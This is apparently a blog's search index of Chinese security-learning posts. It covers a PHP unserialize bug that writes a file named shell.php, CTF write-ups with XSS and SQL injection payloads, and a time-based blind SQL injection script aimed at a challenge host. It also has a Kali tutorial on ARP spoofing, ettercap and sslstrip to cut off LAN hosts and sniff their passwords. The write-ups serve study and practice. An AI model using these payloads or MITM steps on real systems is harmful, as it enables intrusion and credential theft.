<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[序列化和反序列化]]></title>
    <url>%2F2018%2F11%2F01%2F%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%2F</url>
    <content type="text"><![CDATA[什么是序列化&amp;反序列化 序列化： 序列化是将变量转换为可保存或传输的字符串的过程。 反序列化：将在序列化过程中所生成的字符串再转化成原来的变量使用。 PHP序列化的方法 PHP最初通过内置的serialize()和unserialize()函数来实现序列化。serialize()的参数可以是resource类型外的所有变量类型，最常见的是用来序列化对象，unseialize()将serialize的返回结果作为参数，进行反序列化，得到原对象对不受信任的数据上使用内置的unserialize()函数时，通常是有风险的。对于对象有两种“魔术方法”，__sleep()和__wakeup()，可以在类别中实现。而会分别从serialize()和unserialize()中调用，对应于清理和恢复对象的功能。例如，在序列化时可能需要关闭数据库连线，并在反序列化时恢复连线；这个功能可在这两种魔术方法中处理。它们也允许对象选择哪些属性可被序列化。从PHP 5.1开始有面向对象的序列化机制，即为Serializable接口。 PHP序列化的作用对象系列化使用情况： 对象的创建的时候被存储到内存里，在解析的时候被销毁，如果机器重启，那么对象也将被销毁在新建。想要保存对象或者将对象传给另一台机器，就需要将对象串行化（序列化）；或者在需要存储数据到mysql等数据库中时需要系列化。 将对象转化成字符串叫系列化(串行化) 将字符串转化成对象叫反系列化(反串行化) 数组系列化使用情况： 在跨语言，跨设备传输数组时，存放数据库或nosql数据库时，由于两者之间的数据格式不同，所以要将数据统一转成json(JavaScript object )格式传输。 总之，就是方便数据传输和存储 实例说明1234567891011121314151617181920212223&lt;?php ################建立一个数组###################$arr1 = [];for($i=0; $i&lt;5; $i++) $arr1['key'.$i] = 'value'.$i;echo "建立一个数组arr1：";print_r($arr1);echo "&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;";##############################################################序列化该数组###################$arr_serialize = serialize($arr1);echo "arr1序列化后为：";print_r($arr_serialize);echo "&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;";#############################################################反序列化后输出##################$arr_back = unserialize($arr_serialize);echo "arr_serialize反序列化后为：";print_r($arr_back);##############################################?&gt; 输出结果如下 注意这里序列化后的开头处是 a 再给出一段代码 123456789101112&lt;?php class test&#123; #这里定义一个类 var $value = 'abc123';&#125;$obj = new test; #new一个对象obj出来$obj_serialize = serialize($obj); #将obj序列化print_r($obj_serialize);echo "&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;";$obj_back = unserialize($obj_serialize); #反序列化obj_serializeprint_r($obj_back); ?&gt; 输出结果为： 发现不同之处 当一个数组序列化时，以a 为标志，对象序列化是以 O 为标志 由此可以解读 PHP 序列化： a 代表的是 array 数组，5代表变量名称有几个字符， s 代表 string字符串类型，4 为 几个字符，后面的是字符串本身……O 代表 object 对象；4代表的是序列化的对象名称有几个字符；对象名称；1为对象有一个值…… unserialize()反序列化函数漏洞 有前面的铺垫，我们可知道序列化得到的字符串是可解读的，那么如果精心构造一个字符串传给unserialize()进行反序列化，就可以控制到我们想控制的东西 前面提到过，当 PHP 调用serizlize()和unserialize()函数时，会调用__sleep()和__wakeup()两个魔术方法（Magic function） 先介绍下魔术方法： 魔术方法（Magic function）在命名自己的类方法时不能使用这些方法名，除非是想用其魔术功能。PHP官方文档-魔术方法PHP中文网-魔术方法 利用反序列化漏洞 unserialize()调用__wakeup()魔术方法 一个例子： 123456789101112&lt;?php class test&#123; #这里定义一个类 var $value = 'abc123'; function __wakeup()&#123; echo "__wakeup&lt;/br&gt;"; &#125;&#125;$demo = unserialize('O:4:"test":1:&#123;s:5:"value";s:6:"abc123";&#125;');#O:4:"test":1:&#123;s:5:"value";s:6:"abc123";&#125;是序列化test-&gt;value的值print_r($demo); ?&gt; 结果如下：明显unserialize()调用了__wakeup() 利用unserialize()函数漏洞 环境： index.php和shell.php index.php12345678910111213&lt;?phpclass test&#123; var $value = '123'; function __wakeup()&#123; $fp = fopen("shell.php","w") ; fwrite($fp,$this-&gt;value); fclose($fp); &#125;&#125;$get = $_GET['getvalue'];unserialize($get);?&gt; 我们可以控制序列化的字符串达到利用__wakeup()函数的目的 这里构造一个包含有phpinfo();的字符串 PHP脚本如下：123456789&lt;?php class test&#123; var $value = '123';&#125;$obj = new test;$obj-&gt;value = "&lt;?php phpinfo(); ?&gt;";$temp = serialize($obj);print_r($temp); ?&gt; 运行后得到O:4:&quot;test&quot;:1:{s:5:&quot;value&quot;;s:19:&quot;&lt;?php phpinfo(); ?&gt;&quot;;} 将其传入漏洞站点 打开shell.php发现成功写入&lt;?php phpinfo(); ?&gt; 并解析成功]]></content>
      <tags>
        <tag>序列化</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用shadowsocks(ss)搭建vpn服务(Debian9)]]></title>
    <url>%2F2018%2F10%2F31%2F%E4%BD%BF%E7%94%A8shadowsocks-ss-%E6%90%AD%E5%BB%BAvpn%E6%9C%8D%E5%8A%A1%2F</url>
    <content type="text"><![CDATA[租云服务器（境外） 充值-&gt;选服务器-&gt;确定-&gt;完成 这里我租的是 Vultr 的服务器配置： Debian9 日本机房 仅仅搭个 VPN ， cpu 、内存、硬盘套餐选个便宜的就行 搭建服务端 ssh连接服务器 12345# wget --no-check-certificate https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks-libev-debian.sh# chmod +x shadowsocks-libev-debian.sh# ./shadowsocks-libev-debian.sh 2&gt;&amp;1 | tee shadowsocks-libev-debian.log 最后一步会让设置端口，密码，加密方式等，按步骤来就行 记住你设置的参数，连接会用到 设置完成，VPN 服务端就搭好了 配置客户端 下载 shadowsocks 的客户端，Windows 客户端 下载完打开 ss 开始配置，地址、端口、密码必填，选择你的加密方式，如果开启允许其他设备连接那就把代理端口设置一下 配置完成，右键任务栏的小飞机图标，选择启动系统代理，就能从设备上翻墙了 使用 GOOGLE BBR 加速（可选） 修改系统变量并保存生效 123# echo "net.core.default_qdisc=fq" &gt;&gt; /etc/sysctl.conf# echo "net.ipv4.tcp_congestion_control=bbr" &gt;&gt; /etc/sysctl.conf# sysctl -p 查看内核是否开启 BBR如下显示即为开启 12# sysctl net.ipv4.tcp_available_congestion_controlnet.ipv4.tcp_available_congestion_control = bbr cubic reno 查看BBR是否启动如下显示即为启动 # lsmod | grep bbr tcp_bbr 20480 8 服务器无法连接 Vultr 换服务器就更换 IP ，所以 IP 是循环使用的可能你的服务器就刚好换到被中国墙了的 IP 或者一段时间的使用后你的 IP 被墙了这都很正常，解决方法：把你的服务器删了，重新选择一次就换 IP 了要是还是被墙，那么推荐你去这里逛逛：|`传送门``|]]></content>
      <categories>
        <category>VPN</category>
      </categories>
      <tags>
        <tag>shadowsocks</tag>
        <tag>ss</tag>
        <tag>VPN</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于Github和Coding布置博客的域名问题]]></title>
    <url>%2F2018%2F10%2F30%2F%E5%85%B3%E4%BA%8EGithub%E5%92%8CCoding%E5%B8%83%E7%BD%AE%E5%8D%9A%E5%AE%A2%E7%9A%84%E5%9F%9F%E5%90%8D%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[先讲清本人blog环境: 使用 Github 和 Coding 两个平台，即 abelche.github.io 和 abelche.coding.me阿里云租的两个域名 abelche.com 和 abelche.top 通过自己的域名访问域名解析 在平台中绑定自己的域名 在域名解析中添加记录 CNAME 类型，从你的域名（主机记录）指向平台域名（记录值）即可 统一 urlCoding 平台布置Coding 的布置比较容易 这是 Coding 的配置界面 我这里绑定了两个，有无 www 的，我只想让 url 出现 www.abelche.top 只需要把跳转选上就行 安全证书有就选上吧 Github 平台布置Github 只能绑定一个域名，所以需要我们在 DNS 解析上做点文章 和 Coding 绑定一样，在 Github 上绑定好域名，这里只能绑定一个域名，我想让访问 url 都为 www 我这里添加的是 www.abelche.com 在阿里云域名管理的 DNS 解析额外添加一条记录]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>url</tag>
        <tag>域名</tag>
        <tag>域名解析</tag>
        <tag>Github</tag>
        <tag>Coding</tag>
        <tag>博客</tag>
        <tag>blog</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WP-DLCTF2018]]></title>
    <url>%2F2018%2F09%2F20%2FWriteup%2FWP-DLCTF2018%2F</url>
    <content type="text"><![CDATA[Web网络安全法百度一下，你就知道 漏洞 Top_10进入题目后先正常查询，发现查到7(XSS)的时候有红色字母提示，解读后发现是 alert(key) ，那么就更明确这道题是 XSS 漏洞，只有一个输入框，那么有可能是突破点 bp 抓下包，发现是 post 传输的 id ，在源码中找到传入的 id 值在&lt;script&gt;&lt;/script&gt;中 而且该值是用&#39;&#39;引起来的，那么直接构造&#39;;alert(&#39;key&#39;);&#39; post 传入得到flag I_DONT_LIKE_MD5这道题是明显的md5碰撞，那么直接 GET 传参5[]=1&amp;&amp;m[]=QNKCDZO&amp;&amp;d[]=s878926199a进入到新网页，按F12得到flag 我是来送分的根据提示，直接在网站个人信息页面查看源码，查找flag 逆向听说WEB有送分？notepad++打开查找flag 杂项basebasebasebase隐写脚本如下 py2712345678910111213141516171819202122232425262728293031323334def get_base64_diff_value(s1, s2): base64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' res = 0 for i in xrange(len(s1)): if s1[i] != s2[i]: return abs(base64chars.index(s1[i]) - base64chars.index(s2[i])) return resdef solve_stego(): with open('./3.txt', 'rb') as f: file_lines = f.readlines() bin_str = '' for line in file_lines: steg_line = line.replace('\n', '') norm_line = line.replace('\n', '').decode('base64').encode('base64').replace('\n', '') diff = get_base64_diff_value(steg_line, norm_line) pads_num = steg_line.count('=') if diff: bin_str += bin(diff)[2:].zfill(pads_num * 2) else: bin_str += '0' * pads_num * 2 res_str = '' for i in xrange(0, len(bin_str), 8): res_str += chr(int(bin_str[i:i+8], 2)) print res_strsolve_stego() 眼见为实打开后发现很长的文本，但是只由0-9，A-F组成，那么有可能是16进制 notepad++打开，工具HEX-&gt;ASCII，保存 记事本打开后发现有一串诡异的字符Z m x h Z 3 t X Z T F j T 2 1 l X 3 Q w X 0 R M T l V D V E Y h I S F 9 去掉空格 base64 解码得到flag 流量分析一个160+M的包，wireshark打开 这么大，加载都半天的东西肯定要分析一下， 结合提示，既然是黑客登陆 web 服务器，且有 webshell 过滤 http 协议，从后往前找，先发现了/image/article/a.php，一看这就是马，打开后更加确定 webshell 为 a.php 继续往前找，找到 http协议 login 的包，先找到用户名为”人事”的登陆信息，不太像答案，再往前找发现了 admin 的登陆信息 提交flag，正确 密码学嘀嘀嘀先摩斯密码解密，解密后是以0x开头的文本，HEX-&gt;ASCII解码，得到 unicode 编码的字符串，&amp;#x0035;&amp;#x0041;&amp;#x0036;&amp;#x0044;&amp;#x0037;&amp;#x0038;&amp;#x0036;&amp;#x0038;&amp;#x0035;&amp;#x0041;&amp;#x0033;&amp;#x0033;&amp;#x0037;&amp;#x0033;&amp;#x0033;&amp;#x0031;&amp;#x0034;&amp;#x0044;&amp;#x0037;&amp;#x0041;&amp;#x0034;&amp;#x0036;&amp;#x0036;&amp;#x0041;&amp;#x0035;&amp;#x0039;&amp;#x0037;&amp;#x0041;&amp;#x0034;&amp;#x0041;&amp;#x0036;&amp;#x0041;&amp;#x0035;&amp;#x0041;&amp;#x0034;&amp;#x0034;&amp;#x0034;&amp;#x0039;&amp;#x0033;&amp;#x0031;&amp;#x0034;&amp;#x0044;&amp;#x0033;&amp;#x0032;&amp;#x0034;&amp;#x0044;&amp;#x0033;&amp;#x0033;&amp;#x0034;&amp;#x0045;&amp;#x0037;&amp;#x0041;&amp;#x0035;&amp;#x0031;&amp;#x0033;&amp;#x0034;&amp;#x0034;&amp;#x0044;&amp;#x0033;&amp;#x0032;&amp;#x0034;&amp;#x0035;&amp;#x0033;&amp;#x0030;&amp;#x0034;&amp;#x0045;&amp;#x0033;&amp;#x0032;&amp;#x0034;&amp;#x0039;&amp;#x0033;&amp;#x0032;&amp;#x0034;&amp;#x0044;&amp;#x0035;&amp;#x0034;&amp;#x0036;&amp;#x0037;&amp;#x0033;&amp;#x0031;&amp;#x0034;&amp;#x0045;&amp;#x0035;&amp;#x0034;&amp;#x0035;&amp;#x0031;&amp;#x0037;&amp;#x0038;&amp;#x0034;&amp;#x0044;&amp;#x0035;&amp;#x0037;&amp;#x0034;&amp;#x0041;&amp;#x0036;&amp;#x0038;&amp;#x0034;&amp;#x0044;&amp;#x0034;&amp;#x0038;&amp;#x0033;&amp;#x0030;&amp;#x0033;&amp;#x0044;继续Unicode转中文解码，得到5A6D78685A3373314D7A466A597A4A6A5A4449314D324D334E7A51344D3245304E3249324D5467314E5451784D574A684D48303D又是16进制，转字符串ZmxhZ3s1MzFjYzJjZDI1M2M3NzQ4M2E0N2I2MTg1NTQxMWJhMH0=base64flag{531cc2cd253c77483a47b61855411ba0} 鸭！这大脸盘子！！！下载一张图片，一看就是猪圈，RWEB 下面给的一串字符串 用维吉尼亚密码解密 RWEB 是密钥 得到flagisvigenereandpigpencipher 提交flag{vigenereandpigpencipher}发现不正确， 看到hint有大写字母，尝试flag{VigenereAndPigPenCipher}正确]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>杂项</tag>
        <tag>DLCTF</tag>
        <tag>web</tag>
        <tag>密码学</tag>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WP-Bugku-杂项系列]]></title>
    <url>%2F2018%2F08%2F26%2FWriteup%2FWP-Bugku-%E6%9D%82%E9%A1%B9%E7%B3%BB%E5%88%97%2F</url>
    <content type="text"><![CDATA[这是一张单纯的图片题目地址http://120.24.86.145:8002/misc/1.jpg 将图片保存下来，直接notpad++查看下，发现末尾有一串 Unicode解码后的到key{you are right} 隐写题目地址http://ctf.bugku.com/files/f8da9b5979e89e91d083c7accdea4427/2.rar 一个压缩包，里面是一张.png的图片 用各种工具查看也没什么发现， 后来知道是修改图片的宽高…… winhex打开后第一行是文件头，固定格式第二行的前四位是宽，后四位是高 winhex打开A4 改为 F4 修改成功 telnet题目地址http://120.24.86.145:8002/misc/telnet/1.zip wireshark打开，查看tcp数据流 得到flag{d316759c281bf925d600be698a4973d5} 眼见非实(ISCCCTF)题目地址http://ctf.bugku.com/files/919ee4ea1658c3e3ef8b59b67f298470/zip 下载得到一个名为 zip 的文件，根据文件名的提示，给它加 .zip 的后缀 果然成功打开，打开后发现 解压后发现文件错误，本着试一试的原则，后缀名改成 .zip结果还真能打开，压缩包里是查看文件，最终在 眼见非实.zip\眼见非实\word\document.xml 这个文件中找到flag flag{F1@g} 又一张图片，还单纯吗题目地址http://120.24.86.145:8002/misc/2.jpg 保存图片，直接扔 binwalk 里foremost 分离后直接得到flag的图片 猜题目地址http://120.24.86.145:8002/misc/cai/QQ20170221-132626.png 题目提示flag是某人名字全拼 图片又是一张不全的照片直接百度识图，搜到原图 key{liuyifei} 宽带信息泄露题目地址http://ctf.bugku.com/files/5986768ca8b96cead45aec16a88431b5/conf.bin 上网搜索得知需要用 RouterPassView 这个软件打开 隐写2题目地址http://ctf.bugku.com/files/af49803469dfdabb80acf562f9381335/Welcome_.jpg 把这张傻子图扔到binwalk上foremost分开，有一个压缩包，里面有一个加密的压缩包和一张图片分析提示，三个数，一个国王，一个女神，一个骑士，又说斗地主……那不就….还是直接暴力破解吧 先做个字典000~999,写了个垃圾的py（但是能用啊）1234567filename = "num.txt"for x in range(10): for y in range(10): for z in range(10): with open(filename, "a") as file_obj: file_obj.write(str(x)+str(y)+str(z)+'\n')file_obj.close() 暴力破解，试了好多，终于找到一个速度快又好用的工具Advanced Archive Password Recovery密码871 拿到图片，notpad++打开得到f1@g{eTB1IEFyZSBhIGhAY2tlciE=} 提交发现不正确！还要解密….base64解密 eTB1IEFyZSBhIGhAY2tlciE= 得到y0u Are a h@cker!最后输入flag{y0u Are a h@cker!} 多种方法解决题目地址http://120.24.86.145:8002/misc/3.zip 下载后打开两次会报错，然后就好了，不知道是题目的原因还是真出错了…. 得到一个打不开，后缀改成 .txt 打开是提示图片格式和一长串 base64那就base64转图片解密得到一张二维码 识别后得到KEY{dca57f966e4e4e31fd5b15417da63269} linux题目地址http://120.24.86.145:8002/misc/1.tar.gz 不知道这道题怎么出的，解压，直接notepad++查看文件搜索 key 就得到key{feb81d3834e2423c9903f4755464060b} 中国菜刀题目地址http://ctf.bugku.com/files/047cefd48389dfc5bdc055d348bbf520/caidao.zip 多点几次打开压缩包解压 wireshark打开caidao.pcapng查看tcp流发现有压缩包文件 扔到kali中binwalk 文件 -e得到一个文件，添加后缀.tar，打开得到key{8769fe393f2b998fa6a11afe2bfcd65e} 这么多数据包题目地址http://ctf.bugku.com/files/425d97c3a1a2fa32dcead0ddd90467c0/CTF.pcapng.zip 这道题给的数据包非常多，上网找答案 发现有很多包，快速浏览后发现前面都是攻击机（192.168.116.138）在向目标机（192.168.116.159）进行端口扫描，再往后看到5542已经getshell，追踪TCP数据流，发现txt文件 base64 解码得到 CCTF{do_you_like_sniffer} 做个游戏(08067CTF)题目地址http://ctf.bugku.com/files/465585c655e201384823f64342cfd554/heiheihei.jar 打开后是一个小游戏， 那么Java反编译（推荐Java Decompiler） 找到flag{RGFqaURhbGlfSmlud2FuQ2hpamk=} 将RGFqaURhbGlfSmlud2FuQ2hpamk=进行base64解码得到DajiDali_JinwanChiji 想蹭网先解开密码题目地址http://ctf.bugku.com/files/77decd384a172b9a2294e6c6acfd48cc/wifi.cap 文件是.cap，扔到wireshark里看一下，基本上都是802.11协议的包，WiFi认证过程重点在WPA的四次握手包，也就是eapol协议的包，过滤一下 aircrack-ng 进行破解先生成字典12345678filename = "num.txt"for x in range(10): for y in range(10): for z in range(10): for n in range(10): with open(filename, "a") as file_obj: file_obj.write('1391040'+str(x)+str(y)+str(z)+str(n)+'\n')file_obj.close() aircrack-ng -w num.txt wifi.cap开始破解 Linux2题目地址：链接: http://pan.baidu.com/s/1skJ6t7R 密码: s7jy 又是linux，以bugku一贯的niaoxing，搜索key然后……然后就找到了…. 账号被盗了题目地址http://120.24.86.145:9001/ 打开题目后发现一个按钮，点击后跳出 第一反应bp抓包改包 这里的false改为true即可 然后跳出一个链接，进入后保存文件发现是一个cf刷枪的程序 wireshark抓包，账号密码随便填写，提交，抓到后查看TCP数据流， 都是base64，解码后得到用户名和密码，发现是网易邮箱 登陆后在邮件草稿里能看到flag（要是flag提交不了就是有人恶搞了，没办法） 细心的大象题目地址https://share.weiyun.com/9287be0a629971ac53d97f39727eee18 压缩包里有一张图片，扔到binwalk上发现 分离后是一个压缩包，里面有第二张图片但是需要密码，查看了下图片1的属性，果然找到了备注一串字符一看就是经过base64加密的，拿去解密后就是图片2的密码 查看图片2发现是500px420px，为啥不是500px500px呢？ 用winhex打开将标记的A4修改为F4 打开就会发现flag 爆照(08067CTF)题目地址http://ctf.bugku.com/files/fa88c409b367aa9243313a85d138d183/8.jpg 一张穹妹的图片，binwalk扫一下后 分离后得到一个压缩包 notepad++查看后发下头部有jfif的标记，将文件添加后缀.jfif转换成图片后发现88.jfif有个两个二维码一个能扫出来一个扫不出来扫码是一串字符 bilibili 剩下的扔到kali上binwalk跑，发现8888.jfif有压缩包，foremost分离后解压会得到一个二维码扫码后得到一串字符panama 继续binwalk会发现后面的图片是正常的 剩下的只有之前的888.jfif有修改的痕迹，foremost分离出一张.jpg的图片果然在备注中发现了base64解码后得到silisili 按名称排序flag{bilibili_silisili_panama} 流量分析(cnss)题目地址http://ctf.bugku.com/files/7f9a18ccd16fa1c52f3fad835ad8df8e/1490637625.pcapng 用wireshark打开后分析Tcp数据流 发现http://space.bilibili.com/17190571/这个用户，那么打开访问一下发现 拿去base64解码后发现好像不对啊，上网查了下wp发下好像是被别人搞了 没办法，总之这道题base64解码两次就ok了 这是flagcnss{b1libil1_A_gay_wEbsite} 猫片(安恒)题目地址http://ctf.bugku.com/files/9f1bebac6b8282da716720cc99f35bed/png 一个名叫png的文件，给他加个.png的后缀，变成一个图片 扔到binwalk上看下，没有问题 涉及的东西有点多先放一下https://blog.csdn.net/x947955250/article/details/81482471 妹子的陌陌题目地址http://120.24.86.145:8002/misc/momo.jpg 下载后是一张照片binwalk发现有压缩包，改后缀.zip打开有一个.txt文件，需要密码解压，图片上有喜欢我吗.五个字符，密码就是这个 解压后得到 解密第一个摩斯密码得到HTTP//ENCODE.CHAHUO.COM/构造成urlHTTP://ENCODE.CHAHUO.COM/ 在这个网站中选择AES解密U2FsdGVkX18tl8Yi7FaGiv6jK1SBxKD30eYb52onYe0= 得到momoj2j.png 访问http://c.bugku.com/momoj2j.png 得到二维码，扫描后得到flag，要是扫不出来就将图片反相做一下再扫]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>杂项</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WP-Bugku-Web进阶系列]]></title>
    <url>%2F2018%2F08%2F26%2FWriteup%2FWP-Bugku-Web%E8%BF%9B%E9%98%B6%E7%B3%BB%E5%88%97%2F</url>
    <content type="text"><![CDATA[phpcmsV9题目地址http://120.24.86.145:8001/ 不知道为什么，御剑扫后台直接出来了 海洋CMS题目地址http://120.24.86.145:8008/ 来晚了，这题已经被日的面目全非]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>Web进阶</tag>
        <tag>cms</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kali渗透常用工具]]></title>
    <url>%2F2018%2F08%2F23%2Fkali%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[本文中所使用工具的原理及方法arpspoof工具的arp欺骗ARP地址解析协议(ARP)，ARP(Address Resolution Protocol)，是一个位于TCP/IP协议栈中的网络层。当局域网内计算机间（或者是计算机与网关间）需要通信时，使用ARP协议获取目标IP地址对应的MAC地址，然后计算机间再通过该MAC地址完成数据包发送。ARP欺骗一般目的是把自己伪装成网关，从而欺骗目标机器，使本应发送到真实网关的数据包发送到欺骗者的机器。 arpspoof工具 功能： arpspoof通过伪造arp回复包将局域网中主机A（或者所有主机）的网路包重定向到主机B。用法： arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host driftnet的图片抓取ettercap的嗅探sslstrip将HTTPS的链接还原为HTTP 局域网断网工具ARP攻击就是通过伪造IP地址和MAC地址实现ARP欺骗，能够在网络中产生大量的ARP通信量使网络阻塞，攻击者只要持续不断的发出伪造的ARP响应包就能更改目标主机ARP缓存中的IP-MAC条目，造成网络中断或中间人攻击。 这里我用我的win10物理机当作目标机，这里可见此时是可以 ping 通 baidu 的进行arp攻击arpspoof -i 网卡名称 -t 目标机ip 网关发现物理机已经断网了 获取内网他人浏览的图片物理机当作目标机kali 使用 arpspoof 工具 arpspoof -i 网卡名称 -t 目标机ip kali的ip使用 driftnet 工具 driftnet -i 网卡名称 ，然后在目标机上百度搜索图片，可以看到 driftnet 有了反应，获取成功 获取他人账号密码(HTTP)物理机当作目标机kali 先打开ip转发 echo 1 &gt; /proc/sys/net/ipv4/ip_forward(了解更多)arp欺骗 arpspoor -i 网卡名称 -t 目标机ip kali的ip使用ettercap进行嗅探 ettercap -Tq -i eth0成功启动后在物理机上测试，在http协议的网站输入用户名和密码，发现已经被 ettercap 嗅探到 获取他人账号密码(HTTPS)https://www.cnblogs.com/BloodZero/p/4415483.html 先vim /etc/ettercap/etter.conf找到如图段落，将 # 注释删去配置 echo 1 &gt; /proc/sys/net/ipv4/ip_forward对 HTTPS 嗅探需要在 arp 欺骗 arpspoof -i 网卡名称 -t 目标机ip 网关 和 ettercap 抓包 ettercap -Tq -i eth0 时使用工具 sslstrip sslstrip -a -f -k在目标机上测试，在https站点登陆(正常来说应该会被ettercap抓到，但是由于现在浏览器安全等级很高，直接阻止了建立连接，所以这个实验没有百分之百完成) 会话劫持]]></content>
      <categories>
        <category>Learning</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>笔记</tag>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WP-Bugku-PHP_encrypt_1(ISCCCTF)]]></title>
    <url>%2F2018%2F08%2F21%2FWriteup%2FWeb%2FWP-Bugku-PHP-encrypt-1-ISCCCTF%2F</url>
    <content type="text"><![CDATA[题目直接给出了加密源码123456789101112131415161718192021&lt;?phpfunction encrypt($data,$key)&#123; $key = md5('ISCC'); $x = 0; $len = strlen($data); $klen = strlen($key); for ($i=0; $i &lt; $len; $i++) &#123; if ($x == $klen) &#123; $x = 0; &#125; $char .= $key[$x]; $x+=1; &#125; for ($i=0; $i &lt; $len; $i++) &#123; $str .= chr((ord($data[$i]) + ord($char[$i])) % 128); &#125; return base64_encode($str);&#125;?&gt; 输出 fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA= 这里直接给出解密的源码1234567891011121314151617181920212223242526272829303132333435&lt;?phpfunction decrypt($str) &#123; $mkey = "729623334f0aa2784a1599fd374c120d"; $klen = strlen($mkey); $tmp = $str; $tmp = base64_decode($tmp); // 对 base64 后的字符串 decode $md_len = strlen($tmp); //获取字符串长度 for ($i=0; $i &lt; $md_len; $i++) &#123; // 取二次加密用 key; if ($x == $klen) // 数据长度是否超过 key 长度检测 $x = 0; $char .= $mkey[$x]; // 从 key 中取二次加密用 key $x+=1; &#125; $md_data = array(); for($i=0;$i&lt;$md_len;$i++) &#123; // 取偏移后密文数据 array_push($md_data, ord($tmp[$i])); &#125; $md_data_source = array(); $data1 = ""; $data2 = ""; foreach ($md_data as $key =&gt; $value) &#123; // 对偏移后的密文数据进行还原 $i = $key; if($i &gt;= strlen($mkey)) &#123;$i = $i - strlen($mkey);&#125; $dd = $value; $od = ord($mkey[$i]); array_push($md_data_source,$dd); $data1 .= chr(($dd+128)-$od); // 第一种可能, 余数+128-key 为回归数 $data2 .= chr($dd-$od); // 第二种可能, 余数直接-key 为回归数 &#125; print "data1 =&gt; ".$data1."&lt;br&gt;\n"; print "data2 =&gt; ".$data2."&lt;br&gt;\n";&#125;$str = "fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=";decrypt($str);?&gt; Flag:{asdqwdfasfdawfefqwdqwdadwqadawd}]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>Web</tag>
        <tag>Bugku</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WP-Bugku-login2(SKCTF)]]></title>
    <url>%2F2018%2F08%2F21%2FWriteup%2FWeb%2FWP-Bugku-login2-SKCTF%2F</url>
    <content type="text"><![CDATA[题目地址http://118.89.219.210:49165/ 随便输入用户名，密码抓包测试，发现返回的爆里有一个tip base64解码后的到源码：123$sql="SELECT username,password FROM admin WHERE username='".$username."'";if (!empty($row) &amp;&amp; $row['password']===md5($password))&#123; &#125; 题目提示了union 那么尝试注入1&#39; union select 1,&#39;5f4dcc3b5aa765d61d8327deb882cf99&#39;--password 这里 5f4dcc3b5aa765d61d8327deb882cf99 是经过md5加密后的 password 登陆成功后跳转到了 http://118.89.219.210:49165/index.php]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Bugku</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WP-Bugku-INSERT INTO注入]]></title>
    <url>%2F2018%2F08%2F19%2FWriteup%2FWeb%2FWP-Bugku-INSERT%20INTO%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[题目地址http://120.24.86.145:8002/web15/ 题目给了源码123456789101112131415161718192021222324252627error_reporting(0);function getIp()&#123; $ip = ''; if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))&#123; $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; &#125;else&#123; $ip = $_SERVER['REMOTE_ADDR']; &#125;$ip_arr = explode(',', $ip);return $ip_arr[0];&#125;$host="localhost";$user="";$pass="";$db="";$connect = mysql_connect($host, $user, $pass) or die("Unable to connect");mysql_select_db($db) or die("Unable to select database");$ip = getIp();echo 'your ip is :'.$ip;$sql="insert into client_ip (ip) values ('$ip')";mysql_query($sql); 这是X_FORWARDED_FOR注入，但是过滤了,在,被过滤的情况下，无法使用if语句当然在mysql下除了if还有1select case when xxx then xxx else xxx end; 而且由于,被过滤，无法使用substr和substring，但是这里可以使用from 1 for 1替代，最后payload如下111'+(select case when substr((select flag from flag) from 1 for 1)='a' then sleep(5) else 0 end))%23 python 脚本12345678910111213141516171819import requestsimport string mystring = string.ascii_letters+string.digitsurl='http://120.24.86.145:8002/web15/'data = "127.0.0.1'+(select case when (substring((select flag from flag) from &#123;0&#125; for 1)='&#123;1&#125;') then sleep(5) else 1 end) and '1'='1" #这里的&#123;&#125;对应的是后面所需要的formatflag = ''for i in range(1,35): for j in mystring: try: headers = &#123;'x-forwarded-for':data.format(str(i),j)&#125; res = requests.get(url,headers=headers,timeout=3) except requests.exceptions.ReadTimeout: flag += j print flag breakprint 'The final flag:'+flag 这个代码的原理就是利用127.0.0.1+true/false去进行判断，如果是true，就与超时相违背，从而执行下面except的代码。 得到 flag{cdbf14c9551d5be5612f7bb5d2867853}]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Bugku</tag>
        <tag>X_FORWARDED_FOR注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WP-Bugku-各种绕过]]></title>
